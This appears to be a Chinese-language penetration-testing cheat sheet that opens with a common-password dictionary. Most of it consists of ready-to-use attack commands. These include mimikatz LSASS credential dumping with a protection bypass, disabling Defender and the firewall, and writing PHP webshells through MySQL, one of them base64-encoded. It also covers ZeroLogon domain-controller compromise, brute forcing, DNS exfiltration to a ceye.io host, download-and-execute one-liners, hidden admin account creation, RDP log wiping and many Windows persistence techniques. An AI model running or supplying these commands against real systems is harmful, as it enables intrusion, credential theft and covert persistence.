1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50050,50300,50389,50500,50636,50800,51111,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389 字典 top200 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207123456password1234567891234567812345qwerty123123111111abc1231234567dragon1q2w3e4rsunshine654321master1234football1234567890000000computer666666supermanmichaelinternetiloveyoudaniel1qaz2wsxmonkeyshadowjessicaletmeinbaseballwhateverprincessabcd1234123321starwars121212thomaszxcvbnmtrustno1killerwelcomejordanaaaaaa123qwefreedompassword1charliebatmanjennifer7777777michellediamondolivermercedesbenjamin11111111snoopysamanthavictoriamatrixgeorgealexandersecretcookieasdfgh987654321123abcorangefuckyouasdf1234pepperhuntersilverjoshuabanana1q2w3echelsea1234qwersummerqwertyuiopphoenixandrewq1w2e3r4elephantrainbowmustangmerlinlondongarfieldrobertchocolate112233samsungqazwsxmatthewbusterjonathangingerflower555555testcarolineamandamaverickmidnightmartinjunior88888888anthonyjasminecreativepatrickmickey123qwerty123cocacolachickenpassw0rdforeverwilliamnicolehelloyellownirvanajustinfriendscheesetiggermotherliverpoolblink182asdfghjklandreaspiderscooterrichardsoccerrachelpurplemorganmelissajacksonarsenal222222qwe123gabrielferrarijasperdaniellebanditangelascorpionprincemaggieaustinveronicanicholasmonsterdextercarlosthundersuccesshannahashley131313stellabrandonpokemonjosephasdfasdf999999metallicadecemberchestertaylorsophiesamuelrabbitcrystalbarneyxxxxxxstevenrangerpatriciachristianassholespidermansandrahockeyangelssecurityparkerheather888888victorharley333333systemslipknotnovemberjordan23canadatennisqwertyuicasper Mimikatz一条命令 1.\\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit 控制台执行多条命令，用log防止进程崩溃，数据丢失 1234mimikatz # privilege::debugmimikatz # logmimikatz # sekurlsa::logonpasswordsmimikatz # sekurlsa::wdigest msf中执行命令 12mimikatz_command -f sekurlsa::logonPasswords fullmimikatz_command -f sekurlsa::wdigest 注册表开启wdigest,08r2后默认关闭。需要目标注销，重新登录。2016需要重启。 1reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1 bypass lsa Protection(ppl)查询是否启用 12reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa 把mimidriver.sys拷贝到同级目录，进行加载bypass 1234567mimikatz # !+mimikatz # !processprotect /process:lsass.exe /removemimikatz # privilege::debug mimikatz # token::elevatemimikatz # sekurlsa::logonpasswordsmimikatz # !processprotect /process:lsass.exemimikatz # !- cs凭证解析提取用户名 1awk -F&quot;:::&quot; &#x27;&#123;print $1&#125;&#x27; credentials.txt | awk -F&quot;\\\\&quot; &#x27;&#123;print $2&#125;&#x27; 提取hash 1awk -F&quot;:::&quot; &#x27;&#123;print $2&#125;&#x27; credentials.txt 存活主机1for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr “TTL=” bypassDefender排除项 12powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath &quot;C:\\test&quot; gobuster1gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt dirsearch1python3 dirsearch.py -e php,html,js -u https://target 1python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist 1python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20 1python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080 1python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080 nbtscan1nbtscan.exe 10.11.1.0/24 代理工具proxychainsockscap64proxifier https://drive.google.com/drive/folders/1x5naJeK2YkV6QCYUlUg5QNMl1Izf4-tihttps://www.mediafire.com/folder/32rj1769a2w82/v4.7 内网穿透工具fuso https://github.com/editso/fuso.git 相对冷门，不会被杀在9004上开启socks5代理 1fuc.exe 159.138.0.0 9003 -h 127.0.0.1 -p 9004 -b 9004 -n test -t socks5 --bridge-host 0.0.0.0 --bridge-port 9004 frpnpsioxStowawayhttps://github.com/lz520520/Stowaway Venomhttps://github.com/Dliv3/Venom ssh无记录shell 1ssh -T root@192.168.1.1 /usr/bin/bash -i grep1grep -E &quot;([0-9]&#123;1,3&#125;[\\.])&#123;3&#125;[0-9]&#123;1,3&#125;&quot; -r xxx --color=auto 1grep -E &quot;https?://[a-zA-Z0-9\\.\\/_&amp;=@$%?~#-]*&quot; -r xxx --color=auto 1grep -EHirn &quot;accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into&quot; APKfolder/ 1grep -ohr -E &quot;https?://[a-zA-Z0-9\\.\\/_&amp;=@$%?~#-]*&quot; /app/ |sort|uniq &gt;&gt; test.txt mysql开远程 12345use mysql; update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;; FLUSH PRIVILEGES ; select host, user from user; mysql -uroot -p -e &quot;select * from mysql.user;&quot; &gt;1.txt 不登录直接执行sql 12mysql -uaHmin -proot test -e &quot;select now()&quot; -N &gt;H:/work/target1.txtmysql -uroot -e &quot;show databases;&quot; &gt;1.txt mysql getshell 123show variables like &#x27;%secure%&#x27; select &#x27;&lt;?php eval($_POST[xxx]) ?&gt;&#x27; into outfile &#x27;/var/www/xx.php&#x27;; select &#x27;&lt;?php eval($_POST[xx]) ?&gt;&#x27; into dumpfile &#x27;/var/www/xx.php&#x27;; 123set global general_log=on; set global general_log_file=&#x27;/var/www/1.php&#x27;; select &#x27;&lt;?php eval($_POST[s6]) ?&gt;&#x27;; 12select &#x27;&lt;?php file_put_contents(&quot;abab.php&quot;,base64_decode(&quot;Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K&quot;));?&gt;&#x27; into outfile &#x27;C:/wamp/www/abb.php&#x27;; sqlmap1python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --proxy &quot;http://127.0.0.1:1080&quot; 1python sqlmap.py -u &quot;http://www.vuln.cn&quot; –cookie &quot;id=11&quot; --level 2 1python sqlmap.py -u &quot;www.xxxx.com/product/detail/id/3*.html&quot; --dbms=mysql -v 3 1python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --dbms mysql --dbs 1python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --dbms mysql -D test --tables 1python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --dbms mysql -D test -T admin –-columns 1python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --dbms mysql -D test -T admin -C &quot;username,password&quot; --dump 1python sqlmap.py -r &quot;c:\\request.txt&quot; -p id –dbms mysql –file-read=&quot;e:\\www\\as\\config.php&quot; 找可写目录1234567891011121314151617181920212223242526### linux#### 在/root war文件的同目录下写find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$(dirname $file)/finddir.txt;done删find /root -name war|while read file;do sh -c &quot;rm $(dirname $file)/finddir.txt&quot;;done#### 在/root war文件夹下写find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$file/finddir.txt;done删find /root -name war|while read file;do sh -c &quot;rm $file/finddir.txt&quot;;done### windows#### 在C:\\Users\\liulangmao\\Desktop任意子目录 war.txt文件的同目录下写for /f %i in (&#x27;dir /s /b C:\\Users\\liulangmao\\Desktop\\war.txt&#x27;) do (echo %i &gt; %i\\..\\finddir.txt)删for /f %i in (&#x27;dir /s /b C:\\Users\\liulangmao\\Desktop\\war.txt&#x27;) do (del %i\\..\\finddir.txt)#### 在C:\\Users\\liulangmao\\Desktop任意子目录 war文件夹下写for /f %i in (&#x27;dir /s /b C:\\Users\\liulangmao\\Desktop\\war&#x27;) do (echo %i &gt; %i\\finddir.txt)删for /f %i in (&#x27;dir /s /b C:\\Users\\liulangmao\\Desktop\\war&#x27;) do (del %i\\finddir.txt) 示例：在weblogic靶机&#x2F;root 所有war文件夹下的finddir.txt文件中写入该war文件夹的路径。 12find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$file/finddir.txt;done 程序名找启动路径 1wmic process where name=&#x27;mysqld.exe&#x27; get processid,executablepath,name 启动路径找login.jsp 1for /f %i in (&#x27;dir /s /b D:\\UFGOV\\U8\\login.jsp&#x27;) do (echo %i) base64分段不换行追加写文件 1echo|set /p=\\&quot;PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\\&quot; &gt; D:\\UFGOV\\U8\\webapps\\demonstrate.txt 解决cmd无回显问题 1powershell Get-ChildItem C: hydra1234567891011121314参数：-l 指定的用户名 -L 用户名字典-p 指定密码 -P 密码字典-s 指定端口 -o 输出文件-t 任务数默认16-f 爆破成功一个就停止-v 报错日志详细 -V 攻击日志&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 smb -vV&gt;hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10 medusa1234567参数：-h 目标名或IP -H 目标列表-u 用户名 -U 用户名字典-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程-n 指定端口 -e ns 尝试空密码和用户名密码相同&gt;medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql&gt;medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql python交互shell1python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 1python2 -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27; 无交互添加用户1useradd newuser;echo &quot;newuser:password&quot;|chpasswd 1useradd -p `openssl passwd 123456` guest 1useradd -p &quot;$(openssl passwd 123456)&quot; guest 1useradd newuwer;echo -e &quot;123456\\n123456\\n&quot; |passwd newuser windows123456789net user admin$ Afabab@20 /addnet localgroup administrators admin$ /addnet user guest /active:yesnet localgroup administrators guest /addNet localgroup Administrators kent /add /domain 将域用户添加到域管理员组Net localgroup Administrators /add test\\kent 将域用户添加到本地管理员组 防火墙123456789101112131415161718192021222324252627282930313233343536关闭防火墙netsh firewall set opmode mode=disable放行远程8888端口进来的流量netsh advfirewall firewall add rule name=&quot;88&quot; protocol=TCP dir=in remoteport=8888 action=allow放行出去到远程8888端口的流量netsh advfirewall firewall add rule name=&quot;88&quot; protocol=TCP dir=out remoteport=8888 action=allow放行本地4444端口出去的流量netsh advfirewall firewall add rule name=&quot;44&quot; protocol=TCP dir=out localport=4444 action=allow放行从本地4444端口进来的流量netsh advfirewall firewall add rule name=&quot;44&quot; protocol=TCP dir=in localport=4444 action=allow删除规则netsh advfirewall firewall delete rule name=&quot;88&quot;查看防火墙配置(可看到具体规则等配置)netsh firewall show config关闭windefebdnet stop windefendnetsh firewall set portopening TCP 445 ENABLE //打开445端口 netsh firewall set portopening TCP 3389 ENABLE //开放终端 netsh firewall delete allowedprogram C:/A.exe //删除放行程序A.exe netsh firewall set allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行 netsh firewall add allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行 新版本命令 netsh advfirewall firewall add rule name=&quot;test&quot; dir=in action=allow program=&quot;C:\\windows\\temp\\update.exe&quot; enable=yes netsh advfirewall firewall add rule name=&quot;test&quot; dir=out action=allow program=&quot;C:\\windows\\temp\\update.exe&quot; enable=yes frp常用配置frpc.ini 12345678910111213141516171819[common]server_addr = xxxxxxserver_port = 7000[rdp]type = tcplocal_port = 3389remote_port = 3389[plugin_http_proxy]type = tcpremote_port = 10801plugin = http_proxy[plugin_socks5]type = tcpremote_port = 1080plugin = socks5 ZeroLogon 产生日志 4742(利用成功), 5580(利用失败) 流量特征明显 会被av直接秒 有可能会导致目标脱域 代理不稳，容易出问题 123456git clone https://github.com/mstxq17/cve-2020-1472.gitpython3 zerologon_tester.py Dc02 172.23.119.120 域外检测PingCastle.exe --server 172.23.119.120 --scanner zerologon --scmode-dc 域内检测 洞清空目标域控机器账户密码 12python3 cve-2020-1472-exploit.py Dc02$ 172.23.119.120 无密码远程提取 ntds.dit 1python3 secretsdump.py qq.local/&#x27;Dc02$&#x27;@172.23.119.120 -no-pass -outputfile qq.local.ntds.hash 用 administrator 域管账户 hash 远程导出域控机器账户 hash [hex 格式] 1python3 secretsdump.py -hashes :ccef208c6485269c20db2cad21734fe7 qq/administrator@172.23.119.120 用上面的 hex 还原目标域控机器账户密码 12python3 restorepassword.py Dc02@Dc02 -target-ip 172.23.119.120 -hexpass daf1d2acc25d2e54218921737a40d58192b9bcdf089ddbeaf9f7931571b07916f96e2c51d8d00f56d2440c13c0e5586e2dafd1669e37131*** 删rdp日志清除远程桌面连接记录,创建clear.bat 123456@echo offreg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default&quot; /va /freg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot; /freg add &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot;cd %userprofile%\\documents\\attrib Default.rdp -s -hdel Default.rdp 开338912345系统windows server 2003后wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fnet start TermService 文件搜索https://www.anquanke.com/post/id/245019 1findstr /s /i /n /d:C:\\ /c:&quot;123123&quot; *.txt 1for /r C: %i in (login.*) do @echo %i 1where /R C: login.* 1dir /s/a-d/b login.* 1find / -name index.php 1find / -name index.php 1find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot; 1updatedb &amp;&amp; locate index.php 12进程路径wmic process get name,executablepath 外带oobWindows在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。 1echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;set /p ADDR=&lt;temp2&amp;&amp;nslookup %ADDR%.is1lv6.ceye.io 下面这个语句，主要是过滤作用。把helo.txt文件中的“&#x3D;”过滤并重新输出文件。 1for /f &quot;delims=^= tokens=1,*&quot; %i in (helo.txt) do (echo %i&gt;&gt;text3.txt) 为什么在上面需要过滤&#x3D;，主要是因为在执行ping命令的时候是不允许带&#x3D;号的，相较于nslookup，ping命令成功率相对较高，但如果路径过长，可能会导致失败。具体多长需要大家自行试验。 1echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;for /f &quot;delims=^= tokens=1,*&quot; %i in (temp2) do (echo %i&gt;&gt;temp3)&amp;&amp;set /p ADDR=&lt;temp3&amp;ping %ADDR%.is1lv6.ceye.io 如果需要外带多行命令，则需要以下语句： 12where /R C: login.* &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&#x27; &#x27;,&#x27;&#x27;);$j=11111;foreach($i in $sub)&#123; $fin=$j.tostring()+&#x27;.&#x27;+$i+&#x27;.is1lv6.ceye.io&#x27;;$j += 1; nslookup $fin &#125;（b）Linux 在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。 1ping pwd|tr -d &#x27;\\n&#x27;|xxd -ps.is1lv6.ceye.io base64原理和上面类似，主要是对值进行base64编码，然后替换掉“&#x3D;”，即可成功外带数据。 1pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io 如果有多行数据需要外带，那么请考虑下面的语句。 1var=11111 &amp;&amp; for b in $(find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot;|xxd -p); do var=$((var+1)) &amp;&amp; dig $var.$b.is1lv6.ceye.io; done powershell文件下载1powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.1.1/1.exe&#x27;,&#x27;C:\\test\\1.exe&#x27;);start-process &#x27;C:\\test\\1.exe&#x27; 1powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.1.1/1.exe&#x27;,&#x27;1.exe&#x27;) 1Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http://xxx.xx.xx.xx/test.ps1&quot;) bypass 1echo (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.31.93:8000/tomcat.exe&#x27;,&#x27;C:/Users/test/cc.exe&#x27;)| powershell - certutil.exe下载1certutil.exe -urlcache -split -f http://192.168.1.1/1.exe 1certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.exe 1certutil.exe -urlcache -split -f http://192.168.6.27:8012/download/f.ext C:\\windows\\temp\\up.exe &amp;&amp;start C:\\windows\\temp\\up.exe 删除缓存 1certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete 查看缓存项目： 1certutil.exe -urlcache * 转为base64 1certutil -encode lcx64.exe lcx64.txt 转回来 1certutil -decode lcx64.txt lcx64.exe 查看md5 1certutil -hashfile a.exe MD5 bypass 12Certutil &amp; Certutil –urlcache –f –split urlCertutil | Certutil –urlcache –f –split url bitsadmin不支持https、ftp协议，php python带的服务器会出错 1bitsadmin /transfer n http://192.168.1.1/1.exe C:\\test\\update\\1.exe windows权限维持Startup目录12345678910111213NT6以后的目录如下：对当前用户有效：C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup对所有用户有效：C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUpNT6以前的目录如下：对当前用户有效：C:\\Documents and Settings\\Hunter\\「开始」菜单\\程序\\启动对所有用户有效：C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动 注册键12reg add &quot;XXXX&quot; /v evil /t REG_SZ /d &quot;[Absolute Path]\\evil.exe&quot; 12345678910111213141516171819202122232425262728293031323334353637381.Load注册键HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load2.Userinit注册键HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。3.Explorer＼Run注册键Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼RunHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼RunExplorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。4.RunServicesOnce注册键RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnceHKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce5.RunServices注册键RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServicesHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices6.RunOnce＼Setup注册键HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼SetupHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup7.RunOnce注册键安装程序通常用RunOnce键自动运行程序，它的位置在HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceExHKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceHKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。8.Run注册键HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunRun是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。 服务1sc create evil binpath= &quot;cmd.exe /k [Absolute Path]evil.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot; 计划任务1SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \\Microsoft\\Windows\\evil\\eviltask /TR C:\\Users\\hunter\\Desktop\\evil.exe WMI事件123456wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __EventFilter CREATE Name=&quot;evil&quot;, EventNameSpace=&quot;root\\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 310&quot;wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;evilConsumer&quot;, ExecutablePath=&quot;C:\\Users\\hunter\\Desktop\\beacon.exe&quot;,CommandLineTemplate=&quot;C:\\Users\\hunter\\Desktop\\beacon.exe&quot;wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\\&quot;evil\\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\\&quot;evilConsumer\\&quot;&quot; 屏幕保护1234reg add &quot;hkcu\\control panel\\desktop&quot; /v SCRNSAVE.EXE /d C:\\Users\\hunter\\Desktop\\beacon.exe /freg add &quot;hkcu\\control panel\\desktop&quot; /v ScreenSaveActive /d 1 /freg add &quot;hkcu\\control panel\\desktop&quot; /v ScreenSaverIsSecure /d 0 /freg add &quot;hkcu\\control panel\\desktop&quot; /v ScreenSaveTimeOut /d 60 /f bitsadmin1234bitsadmin /create evilbitsadmin /addfile evil &quot;C:\\Users\\hunter\\Desktop\\beacon.exe&quot; &quot;C:\\Users\\hunter\\Desktop\\beacon.exe&quot;bitsadmin.exe /SetNotifyCmdLine evil &quot;C:\\Users\\hunter\\Desktop\\beacon.exe&quot; NULbitsadmin /Resume evil Netsh白加黑12345可以通过导入helperdll的方式做权限维持，命令格式如下：netsh add helper [Absolute evil DLL path]但是由于netsh并不会开启自启动，因此还要再写一条自启动项：reg add &quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /v Pentestlab /t REG_SZ /d &quot;cmd /c C:\\Windows\\System32\\netsh&quot;重新启动后依然可获得shell： MSDTC在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启： 123sc qc msdtcsc config msdtc start= auto windows信息收集常用命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990Systeminfo 计算机详细信息(补丁信息)Net start 所启动的服务Wmic service list brief 查询本机服务信息Tasklist 进程列表Wmic startup get command,caption 查看启动该程序信息Schtasks /query /fo LIST /v计划任务Netstat -ano 根据本机端口开放情况来判断有什么服务、其角色Query user || qwinsta 查看当前在线用户Net session 列出会话Net share 查看本机的共享列表Wmic share get name,path,status 查看共享列表Net user 本地用户Net user kkkk 查看本地用户信息Net localgroup 本地用户组Net localgroup /domain 域用户组Net localgroup adminnstrators 本地管理员组成员net localgroup adminstrators /domain 查看登陆过主机的管理员Wmic useraccount get /all 获取域内用户详细信息dsquery user 查看存在的用户Net user /domain 域用户信息Net user kkkk /domain 域用户kkkk信息Net user kent password /add /domain添加域用户Net 